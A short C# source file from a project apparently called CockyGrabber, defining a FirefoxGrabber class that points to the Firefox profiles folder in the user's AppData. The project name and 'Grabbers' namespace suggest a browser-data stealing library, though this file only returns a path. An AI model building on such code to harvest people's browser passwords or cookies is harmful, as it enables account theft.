using System;

namespace CockyGrabber.Grabbers
{
    public class FirefoxGrabber : GeckoGrabber
    {
        public override string ProfilesPath
        {
            get
            {
                return $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Mozilla\\Firefox\\Profiles";
            }
        }
    }
}